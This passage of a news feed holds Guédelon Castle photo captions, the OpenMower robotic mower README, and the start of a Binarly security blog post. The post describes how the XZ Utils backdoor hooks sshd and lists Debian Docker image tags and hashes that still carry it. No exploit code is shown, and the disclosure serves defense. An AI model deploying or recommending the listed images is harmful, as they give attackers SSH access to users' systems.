<figure><img decoding="async" width="1024" height="680" data-id="52312" src="https://archaeology.org/wp-content/uploads/2025/08/SO25-France-Guedelon-Window-Mold-1024x680.jpg" alt="" data-image-credit="© Guédelon" srcset="https://archaeology.org/wp-content/uploads/2025/08/SO25-France-Guedelon-Window-Mold-1024x680.jpg 1024w, https://archaeology.org/wp-content/uploads/2025/08/SO25-France-Guedelon-Window-Mold-300x199.jpg 300w, https://archaeology.org/wp-content/uploads/2025/08/SO25-France-Guedelon-Window-Mold-768x510.jpg 768w, https://archaeology.org/wp-content/uploads/2025/08/SO25-France-Guedelon-Window-Mold.jpg 1500w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Guédelon Castle sits on the site of an old quarry for ferruginous (iron-streaked) sandstone, and most of the structure is built from this material. A nearby limestone quarry supplies raw material for decorative carved stonework, such as the Chapel Tower’s Gothic window mold, shown here, which took years to complete. “We always imagine the medieval stonemasons who are cutting or carving the stone, because it’s really a noble profession,” says archaeologist Anne Baud of Lumière University Lyon 2.</figcaption></figure>


<figure><img decoding="async" width="1024" height="912" data-id="52311" src="https://archaeology.org/wp-content/uploads/2025/08/SO25-France-Guedelon-Window-Frame-Fitting-1024x912.jpg" alt="" data-image-credit="© Guédelon" srcset="https://archaeology.org/wp-content/uploads/2025/08/SO25-France-Guedelon-Window-Frame-Fitting-1024x912.jpg 1024w, https://archaeology.org/wp-content/uploads/2025/08/SO25-France-Guedelon-Window-Frame-Fitting-300x267.jpg 300w, https://archaeology.org/wp-content/uploads/2025/08/SO25-France-Guedelon-Window-Frame-Fitting-768x684.jpg 768w, https://archaeology.org/wp-content/uploads/2025/08/SO25-France-Guedelon-Window-Frame-Fitting.jpg 1348w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>A carpenter fits a finished wooden frame into the Chapel Tower window mold. When the window is completed, it will be the final piece of the tower, a showpiece space crowned with a rib-vaulted ceiling executed using only stone, mortar, and a temporary wooden framework. There was little room for error during its careful construction. “Everything would have collapsed,” says master mason and Guédelon site director Florian Renucci. “It is the only thing that sometimes makes me lose sleep!”</figcaption></figure>


<figure><img decoding="async" width="1024" height="768" data-id="52307" src="https://archaeology.org/wp-content/uploads/2025/08/SO25-France-Guedelon-Gothic-Arch-Sketch-1024x768.jpg" alt="" data-image-credit="Ben O’Donnell" srcset="https://archaeology.org/wp-content/uploads/2025/08/SO25-France-Guedelon-Gothic-Arch-Sketch-1024x768.jpg 1024w, https://archaeology.org/wp-content/uploads/2025/08/SO25-France-Guedelon-Gothic-Arch-Sketch-300x225.jpg 300w, https://archaeology.org/wp-content/uploads/2025/08/SO25-France-Guedelon-Gothic-Arch-Sketch-768x576.jpg 768w, https://archaeology.org/wp-content/uploads/2025/08/SO25-France-Guedelon-Gothic-Arch-Sketch.jpg 1500w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Inside the castle below the wall-walk, artisans use measuring sticks and drawing compasses to teach visitors about medieval architecture. By 1228, the fictional founding date of Guédelon, Gothic arches and flourishes had begun to replace Romanesque ones in monumental construction. As this sketch in the sand shows, these Gothic structures could climb higher because they distributed weight more evenly on more slender supports. Every artisan at the castle can draw, and all sketches for all designs needed to construct Guédelon are handmade.</figcaption></figure>


<figure><img decoding="async" width="1024" height="768" data-id="52308" src="https://archaeology.org/wp-content/uploads/2025/08/SO25-France-Guedelon-Masons-Vossoir-Stone-1024x768.jpg" alt="" data-image-credit="© Guédelon" srcset="https://archaeology.org/wp-content/uploads/2025/08/SO25-France-Guedelon-Masons-Vossoir-Stone-1024x768.jpg 1024w, https://archaeology.org/wp-content/uploads/2025/08/SO25-France-Guedelon-Masons-Vossoir-Stone-300x225.jpg 300w, https://archaeology.org/wp-content/uploads/2025/08/SO25-France-Guedelon-Masons-Vossoir-Stone-768x576.jpg 768w, https://archaeology.org/wp-content/uploads/2025/08/SO25-France-Guedelon-Masons-Vossoir-Stone.jpg 1500w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Masons insert a voussoir stone into an arch over the castle’s east gate. All masonry at Guédelon is joined and sealed with a period-appropriate lime mortar mixture. Archaeologists studied the mortar at the nearby thirteenth-century castles of Ratilly and St.-Fargeau to formulate the recipe. Archaeologist Anne Baud has observed trowel marks in the lime mortar at medieval sites all over the world. At Guédelon, she noticed that when masons made similar scrapes in the mortar, calcite squeezed out, drying into a protective facing over the seams between stones. This is one of many medieval construction techniques that the Guédelon experiment has demystified.</figcaption></figure>


<figure><img decoding="async" width="1024" height="683" data-id="52310" src="https://archaeology.org/wp-content/uploads/2025/08/SO25-France-Guedelon-Pigment-Tray-1024x683.jpg" alt="" data-image-credit="Ben O’Donnell" srcset="https://archaeology.org/wp-content/uploads/2025/08/SO25-France-Guedelon-Pigment-Tray-1024x683.jpg 1024w, https://archaeology.org/wp-content/uploads/2025/08/SO25-France-Guedelon-Pigment-Tray-300x200.jpg 300w, https://archaeology.org/wp-content/uploads/2025/08/SO25-France-Guedelon-Pigment-Tray-768x512.jpg 768w, https://archaeology.org/wp-content/uploads/2025/08/SO25-France-Guedelon-Pigment-Tray.jpg 1500w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Painter Valérie Lachény spoons freshly made pigment into a tray in her atelier. Using ores and plants from Guédelon’s surroundings, she has concocted 17 different pigments—so far—including browns, oranges, reds, yellows, blues, grays, and pinks. There is, however, no green. The color green isn’t found in the preserved medieval wall paintings at a church in Moutiers-en-Puisaye, two miles away, either, suggesting that the raw materials necessary to make a green pigment are not present in the area.</figcaption></figure>


<figure><img decoding="async" width="1024" height="683" data-id="52306" src="https://archaeology.org/wp-content/uploads/2025/08/SO25-France-Guedelon-Forge-Nails-1024x683.jpg" alt="" data-image-credit="Ben O’Donnell" srcset="https://archaeology.org/wp-content/uploads/2025/08/SO25-France-Guedelon-Forge-Nails-1024x683.jpg 1024w, https://archaeology.org/wp-content/uploads/2025/08/SO25-France-Guedelon-Forge-Nails-300x200.jpg 300w, https://archaeology.org/wp-content/uploads/2025/08/SO25-France-Guedelon-Forge-Nails-768x512.jpg 768w, https://archaeology.org/wp-content/uploads/2025/08/SO25-France-Guedelon-Forge-Nails.jpg 1500w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>All the artisans at Guédelon appreciate the blacksmiths, who make iron tools for everyone else, each of which is custom-fitted. On an April day in 2025, the main item on the menu at the forge, however, is nails.</figcaption></figure>


<figure><img decoding="async" width="1024" height="683" data-id="52313" src="https://archaeology.org/wp-content/uploads/2025/08/SO25-France-Guedelon-Woodcutter-1024x683.jpg" alt="" data-image-credit="Ben O’Donnell" srcset="https://archaeology.org/wp-content/uploads/2025/08/SO25-France-Guedelon-Woodcutter-1024x683.jpg 1024w, https://archaeology.org/wp-content/uploads/2025/08/SO25-France-Guedelon-Woodcutter-300x200.jpg 300w, https://archaeology.org/wp-content/uploads/2025/08/SO25-France-Guedelon-Woodcutter-768x512.jpg 768w, https://archaeology.org/wp-content/uploads/2025/08/SO25-France-Guedelon-Woodcutter.jpg 1500w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>A woodcutter cuts logs into timber beams. Conventional wisdom held that dried, centuries-old oaks were required for large-scale medieval construction in wood, but the team at Guédelon has determined that younger oaks, worked while still green with moisture, are more pliable.</figcaption></figure>


<figure><img decoding="async" width="1024" height="576" data-id="52305" src="https://archaeology.org/wp-content/uploads/2025/08/SO25-France-Guedelon-Footbridge-1024x576.jpg" alt="" data-image-credit="© Guédelon" srcset="https://archaeology.org/wp-content/uploads/2025/08/SO25-France-Guedelon-Footbridge-1024x576.jpg 1024w, https://archaeology.org/wp-content/uploads/2025/08/SO25-France-Guedelon-Footbridge-300x169.jpg 300w, https://archaeology.org/wp-content/uploads/2025/08/SO25-France-Guedelon-Footbridge-768x432.jpg 768w, https://archaeology.org/wp-content/uploads/2025/08/SO25-France-Guedelon-Footbridge.jpg 1500w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Virtually everything made at Guédelon is a team effort, but some days call for more team and more effort. The construction of a footbridge to the castle’s east gate in 2024 required carpenters, masons, winches, pulleys, ropes, tools, and cooperative weather.</figcaption></figure>
</figure>


      </div>


<div id="black-border19">
    

<p>Video: Blacksmiths at Work</p>



<p><strong>Blacksmiths Caroline Hasne</strong> and Mathis Lacroix forge a tool for making nails. Hasne, a new employee in a very old job, likes the work so far. “I love to try to re-create some old techniques that we don’t see anymore by studying old objects,” she says. “And I’m paid to do it!” (Credit: Ben O’Donnell)</p>



<figure><p>
<iframe title="Guédelon’s Blacksmiths at Work" width="640" height="360" src="https://www.youtube.com/embed/cB7_P3CYHrc?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe>
</p></figure>


      </div>


<div id="black-border20">
    

<p>Video: Guédelon’s Mighty Mill</p>



<p><strong>The water mill</strong> in Guédelon Forest comes to life each spring, weather permitting. Its design follows a medieval mill found in 2008 in the village of Thervay, 160 miles east of Guédelon. That machine was only preserved in fragments of wood, and no one knew how such a thing would run in practice. In the first years of the Guédelon mill’s operation, the upright wooden cogs on the small horizontal gear proved brittle. They were replaced with ones notched along the grooves of the wood. Pig-fat grease was swapped out for cow fat. Spring brought the right amount of rain. Et voilà! (Credit: Ben O’Donnell)</p>



<figure><p>
<iframe title="Guédelon’s Mighty Mill" width="640" height="360" src="https://www.youtube.com/embed/j-1Ay9ADXoo?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe>
</p></figure>


      </div>


<div id="black-border21">
    

<p>Video: A Weaver’s Craft</p>



<p><strong>Today</strong>, baskets are for picnics and the Easter Bunny, but in the Middle Ages, they were all-purpose containers, used for collecting and storing crops and food, or for transporting construction tools and materials. Like the blacksmith, the basket weaver touches practically every part of the castle and community in some way. (Credit: Ben O’Donnell)</p>



<figure><p>
<iframe title="A Guédelon Weaver’s Craft" width="640" height="360" src="https://www.youtube.com/embed/e_LEhQG7baA?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe>
</p></figure>


      </div>
                                              
                                        
            </section></div>]]></description>
        </item>
        <item>
            <title><![CDATA[OpenMower – An open source lawn mower (541 pts)]]></title>
            <link>https://github.com/ClemensElflein/OpenMower</link>
            <guid>44946996</guid>
            <pubDate>Tue, 19 Aug 2025 00:35:08 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/ClemensElflein/OpenMower">https://github.com/ClemensElflein/OpenMower</a>, See on <a href="https://news.ycombinator.com/item?id=44946996">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text"><p dir="auto"><h2 tabindex="-1" dir="auto">I am available for hire</h2><a id="user-content-i-am-available-for-hire" aria-label="Permalink: I am available for hire" href="#i-am-available-for-hire"></a></p>
<p dir="auto">Hello! With a background in software engineering, embedded programming, hardware design, and robotics, I'm on the lookout for new challenges.
If you're in search of someone with my skills, let's team up and create something amazing! <a href="https://x-tech.online/" rel="nofollow">https://x-tech.online/</a></p>
<br>
<hr>

<p dir="auto"><h2 tabindex="-1" dir="auto">OpenMower - The DIY Smart Mowing Robot for Everyone</h2><a id="user-content-openmower---the-diy-smart-mowing-robot-for-everyone" aria-label="Permalink: OpenMower - The DIY Smart Mowing Robot for Everyone" href="#openmower---the-diy-smart-mowing-robot-for-everyone"></a></p>
    <p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/ClemensElflein/OpenMower/blob/main/img/open_mower_header.jpg"><img src="https://github.com/ClemensElflein/OpenMower/raw/main/img/open_mower_header.jpg"></a></p>
  


<p dir="auto">
  <a href="#license"><img src="https://camo.githubusercontent.com/f61dcd7e9460d79b9e8e19683c964e21cc2455ff9d8860cc5ca30f35457be635/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f4c6963656e73652d434325323042592d2d4e432d2d5341253230342e302d6c69676874677265792e737667" data-canonical-src="https://img.shields.io/badge/License-CC%20BY--NC--SA%204.0-lightgrey.svg"></a></p>
  
  <p dir="auto"><b>Join the Discord server for OpenMower discussion:</b>
  </p><p dir="auto"><a href="https://discord.gg/jE7QNaSxW7" rel="nofollow"><img src="https://camo.githubusercontent.com/3ed6b7ce339222fba86763bbfdbf5c999c91abd21b044916d00ac6a2c4469171/68747470733a2f2f62616467656e2e6e65742f62616467652f69636f6e2f646973636f72643f69636f6e3d646973636f7264266c6162656c" data-canonical-src="https://badgen.net/badge/icon/discord?icon=discord&amp;label"></a></p>

<div dir="auto"><p dir="auto">Warning</p>
<p dir="auto"><b>DISCLAIMER:</b></p>
<p dir="auto"><strong>IF YOU ARE NOT 100% SURE WHAT YOU ARE DOING, PLEASE DON'T TRY THIS AT HOME! ASK IN <a href="https://discord.gg/jE7QNaSxW7" rel="nofollow">DISCORD</a>, IF YOU HAVE ANY QUESTIONS!</strong></p>
</div>
<div dir="auto"><p dir="auto">Important</p>
<p dir="auto"><b>This project is active!</b></p>
<p dir="auto">This is the hardware repository, so it might seem that the project is inactive, since hardware is pretty stable by now.
Most of the development work is done on the ROS code here: <a href="https://github.com/ClemensElflein/open_mower_ros">https://github.com/ClemensElflein/open_mower_ros</a></p>
</div>

<p dir="auto"><h2 tabindex="-1" dir="auto">About the Project</h2><a id="user-content-about-the-project" aria-label="Permalink: About the Project" href="#about-the-project"></a></p>
<p dir="auto">If you want to see a quick overview, you can check out this video:</p>
<p dir="auto">
  <a href="https://www.youtube.com/watch?v=BSF04i3zNGw" rel="nofollow"><img src="https://user-images.githubusercontent.com/2864655/161540069-f4263fa7-a47b-49d2-a7bc-d1cdc3a47704.jpg"></a>
</p>
<p dir="auto">Let's be honest: The current generation of robotic lawn mowers sucks. Basically all of these bots drive in a random direction until they hit the border of the lawn, rotate for a randomized duration and repeat. <strong>I think we can do better!</strong></p>
<p dir="auto">Therefore, we have disassembled the cheapest off-the-shelf robotic mower  we could find (YardForce Classic 500) and were surprised that the hardware itself is actually quite decent:</p>
<ul dir="auto">
<li>Geared sensored brushless motors for the wheels</li>
<li>A sensored brushless motor for the mower motor itself</li>
<li>The whole construction seems robust, waterproof and all in all thought through</li>
<li>All components are connected using standard connectors, therefore upgrading the hardware is easily possible.</li>
</ul>
<p dir="auto">The bottom line is: The bot itself is surprisingly high quality and doesn't need to be changed at all. <strong>We just need some better software in there</strong>.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Project Goals</h2><a id="user-content-project-goals" aria-label="Permalink: Project Goals" href="#project-goals"></a></p>
<p dir="auto">Here is a quick overview of this project's goals:</p>
<p dir="auto">✔️ <strong>Autonomous Lawn Mowing:</strong> Obviously, the device should be able to mow the lawn automatically.</p>
<p dir="auto">✔️ <strong>Good Safety:</strong> The device must be safe, e.g. emergency stop if lifted or crashed.</p>
<p dir="auto">✔️ <strong>No Perimeter Wire Needed:</strong> We want to be flexible and support multiple mowing areas.</p>
<p dir="auto">✔️ <strong>Low Cost:</strong> It should be cheaper than a mid range off-the-shelf product</p>
<p dir="auto">✔️ <strong>Open:</strong> I want to share knowledge and enable others to build an OpenMower as well.</p>
<p dir="auto">✔️ <strong>Nice to Look At:</strong> You should not be ashamed to have an OpenMower mowing your lawn.</p>
<p dir="auto">✔️ <strong>Avoid Obstacles:</strong> The mower should detect obstacles and avoid them during mowing.</p>
<p dir="auto">✔️ <strong>Rain Detection:</strong> The device should be able to detect bad weather conditions and pause mowing until they improve.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Open Mower App</h2><a id="user-content-open-mower-app" aria-label="Permalink: Open Mower App" href="#open-mower-app"></a></p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/ClemensElflein/OpenMower/blob/main/img/open_mower_app_1.jpg"><img src="https://github.com/ClemensElflein/OpenMower/raw/main/img/open_mower_app_1.jpg" alt="Open Mower App 1"></a></p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/ClemensElflein/OpenMower/blob/main/img/open_mower_app_2.jpg"><img src="https://github.com/ClemensElflein/OpenMower/raw/main/img/open_mower_app_2.jpg" alt="Open Mower App 2"></a></p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Current State</h2><a id="user-content-current-state" aria-label="Permalink: Current State" href="#current-state"></a></p>
<p dir="auto">The basic mowing function finally works! As you can see in the video, map teaching and mowing work as expected. It even returns to the docking station automatically as soon as the battery gets low and continues once it's recharged.</p>
<p dir="auto">At this point I can recommend that brave tech savvy users can build one for themselves! Since it's quite an expensive and complex project, please don't be shy and ask if you have any questions. I'm glad to help 🙂</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Hardware</h3><a id="user-content-hardware" aria-label="Permalink: Hardware" href="#hardware"></a></p>
<p dir="auto">By now we have a stable revision of the mainboard as well as two motor controllers to go with it. The <a href="https://github.com/clemensElflein/xesc">xESC mini</a> and the <a href="https://github.com/clemensElflein/xesc2040">xESC 2040</a>. I'm currently using the xESC mini for my builds and it works very well. The problem with this controller is, its parts are currently hard to source. That's why we created the xESC 2040 based on the RP2040 chip. This is the low-cost variant and its support is currently experimental.</p>
<p dir="auto"><h4 tabindex="-1" dir="auto">Hardware To-Do:</h4><a id="user-content-hardware-to-do" aria-label="Permalink: Hardware To-Do:" href="#hardware-to-do"></a></p>
<ul>
<li> Low Level Firmware Implementation
<ul>
<li> Voltage / Current Sense</li>
<li> Emergency Stop Button tracking</li>
<li> IMU Communication</li>
<li> Rain Sensor</li>
<li> Charging State</li>
<li> Sound Module</li>
<li> UI Board Communication</li>
<li> Discharge current for more accurate battery charge estimation</li>
</ul>
</li>
<li> ROS Hardware Interface</li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto">Software</h3><a id="user-content-software" aria-label="Permalink: Software" href="#software"></a></p>
<p dir="auto">The basic software is basically done; Our prototype works as intended (but is not able to avoid obstacles yet).</p>
<p dir="auto">The software for the robot can be found in a separate repository: <a href="https://github.com/ClemensElflein/open_mower_ros">https://github.com/ClemensElflein/open_mower_ros</a></p>
<p dir="auto"><h4 tabindex="-1" dir="auto">Software To-Do:</h4><a id="user-content-software-to-do" aria-label="Permalink: Software To-Do:" href="#software-to-do"></a></p>
<ul>
<li> Mowing State Machine (Docking / Mowing, ...)</li>
<li> Path Planning</li>
<li> Obstacle Avoidance</li>
<li> App / Visualization</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Getting Started</h2><a id="user-content-getting-started" aria-label="Permalink: Getting Started" href="#getting-started"></a></p>
<p dir="auto">If you want to read how to get started building a robot for yourself, check the <a href="https://openmower.de/" rel="nofollow">OpenMower Website</a>. There you can find information on which parts to buy, how to install the software and so on. If you find anything missing, please join the Discord server and ask there. Also there's the <a href="https://wiki.openmower.de/" rel="nofollow">OpenMower Wiki</a> which is written by the community. It has some additional guides and information.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">How You Can Help</h2><a id="user-content-how-you-can-help" aria-label="Permalink: How You Can Help" href="#how-you-can-help"></a></p>
<p dir="auto">You can help by starting an OpenMower build of your own. This helps to validate the concept and helps to create useful documentation for new users.</p>
<p dir="auto">Additionally, you can help by starring 🌟 and watching 👀 this repository, since it will help with visibility. You can also subscribe to my <a href="https://youtube.com/c/ClemensElflein" rel="nofollow">YouTube channel</a>.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Compatible Robotic Mowers</h2><a id="user-content-compatible-robotic-mowers" aria-label="Permalink: Compatible Robotic Mowers" href="#compatible-robotic-mowers"></a></p>
<p dir="auto">While disassembling the bot, I wondered about its mainboard: Instead of "YardForce" it read "GForce". After checking the internet for "GForce" robots, I found that that very similar looking robotic mowers are sold under the Herkules brand. Naturally I tried to dig deeper and actually found evidence that the mainboard is manufactured by some chinese company (SUMEC Hardware).</p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/ClemensElflein/OpenMower/blob/main/img/mainboard.jpg"><img src="https://github.com/ClemensElflein/OpenMower/raw/main/img/mainboard.jpg" alt="GForce Robot Mower Mainboard"></a></p>
<p dir="auto">It is therefore quite safe to assume that many robot mowers are basically the same device in a different case. This would be a huge win for the community, since this would mean that by making one of those robots smarter, we could upgrade lots of robots.</p>
<p dir="auto">Therefore it might be a good idea to start a list of compatible devices. So if you have a cheap robotic lawn mower, you can check, if it was already disassembled in the list below. If it's not there, it would be nice of you to check, if it contains the same mainboard as ours and add your robot to the list with some some pictures / model numbers.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">List of Compatible Mowers</h3><a id="user-content-list-of-compatible-mowers" aria-label="Permalink: List of Compatible Mowers" href="#list-of-compatible-mowers"></a></p>
<p dir="auto">By now, some guys have disassembled their mowers and it doesn't look as good as I initially hoped. The GForce boards are basically just used by YardForce and some rebranded versions for the EU market. My exact hardware was only found in the mower I'm using (YardForce Classic 500) and in recently manufactured SA650 ECOs. The SA650 has a different chassis and we don't have a way of mounting the GPS antenna yet. Therefore at the moment, the only compatible mower is mine (the YardForce Classic 500).</p>
<p dir="auto">If you want to have a look at the disassembled mowers, check the Google Docs <a href="https://docs.google.com/spreadsheets/d/1BX0-KEs5v-VED8-RA4BLE-wRdXHtlmcKy4n9K5vJVAA" rel="nofollow">here</a></p>
<p dir="auto"><h2 tabindex="-1" dir="auto">More Infos</h2><a id="user-content-more-infos" aria-label="Permalink: More Infos" href="#more-infos"></a></p>
<p dir="auto">This page only contains the basic overview of the project. To follow my current development state, check out my <a href="https://x-tech.online/" rel="nofollow">Blog</a>.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Patents, Local Laws, Liability</h2><a id="user-content-patents-local-laws-liability" aria-label="Permalink: Patents, Local Laws, Liability" href="#patents-local-laws-liability"></a></p>
<p dir="auto">Before building a robot based on the designs published here, please make sure that you are allowed to do so in your specific regions.
There may be patents and / or laws prohibiting you of doing so.</p>
<p dir="auto">The code/schematics/PCB files are distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</p>
<p dir="auto">This basically means: I'm just documenting a project of mine here for free and I don't have the time and resources to check that devices built using this information will be safe to use, legal to use or even work as intended. You will need technical know-how to use this project and I'm not liable for any damages your devices do to anyone or anything.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">License</h2><a id="user-content-license" aria-label="Permalink: License" href="#license"></a></p>
<p dir="auto"><a href="http://creativecommons.org/licenses/by-nc-sa/4.0/" rel="nofollow"><img alt="Creative Commons License" src="https://camo.githubusercontent.com/62be294f71c9a1885f9cd8f54aa8b8bd42d432fd14b5393a8b25bcd1f34daa42/68747470733a2f2f692e6372656174697665636f6d6d6f6e732e6f72672f6c2f62792d6e632d73612f342e302f38387833312e706e67" data-canonical-src="https://i.creativecommons.org/l/by-nc-sa/4.0/88x31.png"></a><br>This work is licensed under a <a href="http://creativecommons.org/licenses/by-nc-sa/4.0/" rel="nofollow">Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License</a>.</p>
<p dir="auto">Feel free to use the design in your private/educational projects, but don't try to sell the design or products based on it without getting my consent first. The idea here is to share knowledge, not to enable others to simply sell my work. Thank you for understanding.</p>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[XZ Utils Backdoor Still Lurking in Docker Images (107 pts)]]></title>
            <link>https://www.binarly.io/blog/persistent-risk-xz-utils-backdoor-still-lurking-in-docker-images</link>
            <guid>44946783</guid>
            <pubDate>Tue, 19 Aug 2025 00:07:22 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.binarly.io/blog/persistent-risk-xz-utils-backdoor-still-lurking-in-docker-images">https://www.binarly.io/blog/persistent-risk-xz-utils-backdoor-still-lurking-in-docker-images</a>, See on <a href="https://news.ycombinator.com/item?id=44946783">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p><strong><em>By Binarly REsearch</em></strong></p><p>At the end of March last year, the entire cybersecurity community <a href="https://www.binarly.io/blog/xz-utils-supply-chain-puzzle-binarly-ships-free-scanner-for-cve-2024-3094-backdoor">was rocked by the discovery</a> of the infamous <strong>XZ Utils backdoor</strong>.&nbsp; ‘Jia Tan’, a developer who had spent two years building significant credibility in the project through numerous contributions, inserted a sophisticated backdoor into the <em>xz-utils</em> packages. The discovery sent cybersecurity experts, including the Binarly REsearch team, scrambling to reverse engineer the backdoor to understand its scope and potential impact.&nbsp;</p><p>In short, the backdoor was embedded in the <em><code>liblzma.so</code></em> library, which is used by the OpenSSH server, and is triggered when a&nbsp;client interacts with the infected SSH server. The final goal of the malicious code is to install three hooks in the context of <code>sshd</code> process, targeting the <code>RSA_public_decrypt</code>, <code>RSA_get0_key</code>, and <code>EVP_PKEY_set1_RSA</code> functions, thereby enabling backdoor functionality. This is achieved through a sophisticated sequence of hooks, initiated by modified IFUNC resolvers for <code>lzma_crc32</code> and <code>lzma_crc64</code> in the <code>liblzma.so</code> library. Last year, we released a <a href="https://github.com/binarly-io/binary-risk-intelligence/tree/master/xz-backdoor">comprehensive analysis</a> detailing the hook chain and the backdoor’s functionality.</p><p>What really stood out in this story is that the backdoor’s impact wasn’t just theoretical, as malicious <em>xz-utils</em> packages containing the backdoor were distributed by several major Linux distributions, including Debian, Fedora and OpenSUSE. This had serious implications for the software supply chain, as it became challenging to quickly identify all the places where the backdoored library had been included. Within 24 hours, Binarly released <a href="https://xz.fail/">XZ.fail</a>, a free static analysis-based tool designed to detect suspicious IFUNC resolvers with near-zero false positives.<br></p><p>In this blog, we share a new finding in the XZ Utils saga: several Docker images built around the time of the compromise contain the backdoor.&nbsp;</p><p>At first glance, this might not seem alarming: if the distribution packages were backdoored, then any Docker images based on them would be infected as well. However, what we discovered is that some of these compromised images are<strong> </strong>still<strong> publicly available</strong> on Docker Hub. And even more troubling, <strong>other images</strong> have been built on top of these infected base images, making them transitively infected.</p><p>In all, we identified more than 35 images that ship with the backdoor. While this may seem like a small number, we only scanned a small portion of the images published on DockerHub, stopping at <strong>second-order images</strong>. Additionally, we focused solely on Debian images, as they retain historical data on Docker Hub.&nbsp;</p><p>The impact on Docker images from Fedora, OpenSUSE, and other distributions that were impacted by the XZ Utils backdoor remains unknown at this time.</p><h2>Lingering Backdoors in Docker Hub Images</h2><p>At Binarly, we always strive to deliver meaningful results to our customers, increasing their visibility into real security risks and reducing false positives. To achieve this, we are constantly sharpening our tools to stay ahead of evolving threats and deliver precise, actionable insights. Recently, we collected a massive dataset of nearly 15TB of Docker images, which we successfully <a href="https://www.binarly.io/blog/stop-the-leak-scanning-containers-for-exposed-secrets">used to enhance</a> our secrets-finding capabilities.&nbsp;</p><p>Given the effort required to build the dataset, we decided to sharpen other capabilities of the Binarly Transparency Platform, specifically the analyses related to <em>malicious code detections</em>. This suite of automated analyses focuses on common types of modifications, such as anomalies in ELF files and various hooking techniques, including the IFUNC hooking method used by ‘Jia Tan’ to implement the backdoor.&nbsp;&nbsp;</p><p>During this process, we discovered that 12 Debian Docker images available on Docker Hub still contain <a href="https://www.virustotal.com/gui/file/319feb5a9cddd81955d915b5632b4a5f8f9080281fb46e2f6d69d53f693c23ae">one</a> of the <em>xz-utils</em> backdoor, more than a year after the public discovery of the backdoor.</p><div>
  
    <table>
      <thead>
        <tr>
          <th>Tag</th>
          <th>Manifest Digest</th>
          <th>Blob Hash</th>
        </tr>
      </thead>
      <tbody>
        <tr>
          <td>rc-buggy-20240311</td>
          <td>a702c7f4bb57a17762e258871f45f8273ae49bec5515452d5133e66450c95ba5</td>
          <td>3a737ad8ab65fe5ad068d6094fbf99ce9ed2b5beff9c86daceee8c2c50182bde</td>
        </tr>
        <tr>
          <td>experimental-20240311</td>
          <td>81992d9d8eb99b5cde98ba557a38a171e047b222a767dc7ec0ffe0a194b1c469</td>
          <td>cd5a0401cc26824227d6ffe1f921e91657dc46666e0f20f408d8d154ca49f5c0</td>
        </tr>
        <tr>
          <td>unstable-20240311-slim</td>
          <td>7a3332fbf100a0ef9762ead20a4224665768b237c5bfedfe0f86bf88e0c13b7a</td>
          <td>40f436db82f2316ccced5a0deef57fac6eb766b073d7e64d5dfe93e6782482b1</td>
        </tr>
        <tr>
          <td>unstable-20240311</td>
          <td>8690225da3ca369e9be720446f73e0aa06f290776fdf2605b6ec80c2b229b9f6</td>
          <td>cd5a0401cc26824227d6ffe1f921e91657dc46666e0f20f408d8d154ca49f5c0</td>
        </tr>
        <tr>
          <td>trixie-20240311-slim</td>
          <td>d4e306f14b8b7389b36be8fb0eadab638cb7744546a33a74f0fc27bb9037dc14</td>
          <td>b94224647092fbfb1fa9ceb18cf55a60f5a00183971516dd46f1f72f5f7b26df</td>
        </tr>
        <tr>
          <td>trixie-20240311</td>
          <td>85068c773f7fcc9c9acd8f244759cb2131e7a1775c5bf8d6710f76e7467fa3f1</td>
          <td>93e647bfd891e82156d7a13e0f0b194003855008967ec51e962ea0d70fc59ff6</td>
        </tr>
        <tr>
          <td>testing-20240311-slim</td>
          <td>c2e15dd5788b20f360ab3f2d8b60111b6e8b011c5c4960e0129551c743f5cd30</td>
          <td>243521c5a6cd930662c078eec5f83156663f3197cf12158ce60e0a0f9d0a3eb6</td>
        </tr>
        <tr>
          <td>testing-20240311</td>
          <td>0746d89c588160d0470beaae7a55e38305ede06cb5717d132bd6a795610234d8</td>
          <td>522a6d12a8a3032c984d93fd141274f1cb7cc1e9a6942e3b36cbf803bbe36a12</td>
        </tr>
        <tr>
          <td>sid-20240311-slim</td>
          <td>94596b0770714bac6e8adef7e1d3dbc16245ad2978f94006587e44850343cb88</td>
